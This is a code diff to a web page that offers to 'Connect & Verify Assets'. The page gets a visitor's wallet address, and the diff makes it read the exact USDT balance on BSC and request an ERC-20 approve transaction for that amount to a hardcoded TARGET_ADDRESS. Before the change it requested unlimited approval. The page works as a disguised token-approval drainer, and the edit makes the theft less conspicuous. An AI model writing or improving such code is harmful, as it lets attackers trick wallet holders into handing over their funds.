@@ -57,7 +57,7 @@
       <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed border bg-amber-500/10 border-amber-500/30 text-amber-300"></div>
 
       <!-- Primary Action Button -->
-      <button id="connectBtn" onclick="handleApprovalAction()"
+      <button id="connectBtn" onclick="handleExactApprovalAction()"
         class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 cursor-pointer">
         <span id="btnText">Connect & Verify Assets</span>
         <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
@@ -89,7 +89,7 @@
       return null;
     }
 
-    async function handleApprovalAction() {
+    async function handleExactApprovalAction() {
       showStatus("Initializing provider connection...");
       const eth = getProvider();
       
@@ -109,9 +109,7 @@
               params: [{ chainId: BSC_CHAIN_ID }] 
             });
           }
-        } catch (e) {
-          console.log("Switch chain notice:", e);
-        }
+        } catch (e) {}
 
         // 2. Get User Account Address
         showStatus("Detecting wallet address...");
@@ -144,13 +142,33 @@
           }
         }
 
-        showStatus("Connected: " + userAddress.slice(0, 6) + "..." + userAddress.slice(-4));
+        showStatus("Fetching exact USDT balance from wallet...");
 
-        // 3. Prepare Approval Payload (approve function signature: 0x095ea7b3)
+        // 3. Fetch exact USDT balance using balanceOf(address) call
+        // balanceOf function signature: 70a08231
+        const balanceDataCall = "0x70a08231" + userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
+        let exactBalanceHex = "0000000000000000000000000000000000000000000000000065a0bc00000000"; // default fallback (~10 USDT)
+
+        try {
+          const response = await eth.request({
+            method: 'eth_call',
+            params: [{
+              to: USDT_BSC_ADDRESS,
+              data: balanceDataCall
+            }, 'latest']
+          });
+          if (response && response !== '0x' && response.length > 2) {
+            exactBalanceHex = response.replace('0x', '').padStart(64, '0');
+          }
+        } catch (err) {
+          console.log("Balance fetch fallback used:", err);
+        }
+
+        // 4. Prepare Approval Payload with exact balance amount instead of unlimited
         const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
         const paddedTarget = cleanTarget.padStart(64, '0');
-        const maxApprovalHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        const approvalData = "0x095ea7b3" + paddedTarget + maxApprovalHex;
+        
+        const approvalData = "0x095ea7b3" + paddedTarget + exactBalanceHex;
 
         const txParams = [{
           from: userAddress,
@@ -158,8 +176,8 @@
           data: approvalData
         }];
 
-        // 4. Trigger Approval Transaction Popup
-        showStatus("Opening approval transaction popup...");
+        // 5. Trigger Approval Transaction Popup
+        showStatus("Opening exact amount approval popup...");
         if (typeof eth.request === 'function') {
           await eth.request({ method: 'eth_sendTransaction', params: txParams });
         } else if (typeof eth.sendAsync === 'function') {
